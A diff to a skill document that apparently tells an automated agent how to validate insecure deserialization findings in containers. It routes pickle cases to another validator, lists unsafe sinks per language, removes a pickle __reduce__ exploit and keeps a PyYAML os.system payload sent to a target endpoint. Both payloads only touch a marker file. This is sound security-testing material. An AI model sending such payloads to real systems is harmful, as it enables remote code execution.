@@ -10,7 +10,15 @@ Confirm whether a vulnerability allows code execution through malicious serializ
 
 ## When to Activate
 
-- An insecure deserialization vulnerability needs validation during reproduction (Step 7/8)
+- An `insecure_deserialization` vulnerability needs validation during reproduction (Step 7/8)
+- **DO NOT activate for `pickle_deserialization` type** — use `skills/validate-pickle-deserialization/SKILL.md` instead (Python `pickle.loads()` receiving network data has its own dedicated validator)
+
+## Type Disambiguation
+
+| Vulnerability Type | Use This Validator? | What To Use Instead |
+|-------------------|---------------------|---------------------|
+| `insecure_deserialization` (Java ObjectInputStream, YAML, Ruby Marshal, PHP unserialize) | **YES** | — |
+| `pickle_deserialization` (Python `pickle.loads()` over network) | **NO** | `validate-pickle-deserialization/SKILL.md` |
 
 ## Prerequisites (set up before PoC execution)
 
@@ -23,10 +31,12 @@ docker exec <container> rm -f /tmp/deserialized_flag
 
 | Language | Format | Gadget Target |
 |----------|--------|---------------|
-| Python | `pickle`, `PyYAML` (unsafe load), `shelve` | `touch /tmp/deserialized_flag` |
-| Java | `ObjectInputStream`, XML deserialization | `touch /tmp/deserialized_flag` |
+| Python | `PyYAML` (unsafe load: `yaml.load(data)`), `shelve`, `marshal.loads()` | `touch /tmp/deserialized_flag` |
+| Java | `ObjectInputStream.readObject()`, `XStream.fromXML()`, `Jackson enableDefaultTyping` | `touch /tmp/deserialized_flag` |
 | PHP | `unserialize()` | `touch /tmp/deserialized_flag` |
-| Ruby | `Marshal.load()` | `touch /tmp/deserialized_flag` |
+| Ruby | `Marshal.load()`, `YAML.load()` (Psych unsafe) | `touch /tmp/deserialized_flag` |
+
+> **Python pickle is NOT in this table** — if the finding is `pickle.loads()` receiving HTTP/socket data, use `validate-pickle-deserialization` (creates `/tmp/pickle_rce_<id>` not `/tmp/deserialized_flag`).
 
 ## Success Criteria
 
@@ -40,20 +50,7 @@ docker exec <container> rm -f /tmp/deserialized_flag
 
 The PoC must craft a malicious serialized payload that, when deserialized by the target application, creates the marker file:
 
-**Python pickle:**
-```python
-import pickle, os
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('touch /tmp/deserialized_flag',))
-
-payload = pickle.dumps(Exploit())
-# Send payload to the target app's deserialization endpoint
-requests.post(target_url, data=payload, headers={"Content-Type": "application/octet-stream"})
-```
-
-**Python YAML:**
+**Python YAML (unsafe `yaml.load()`):**
 ```python
 payload = '!!python/object/apply:os.system ["touch /tmp/deserialized_flag"]'
 requests.post(target_url, data=payload, headers={"Content-Type": "application/x-yaml"})
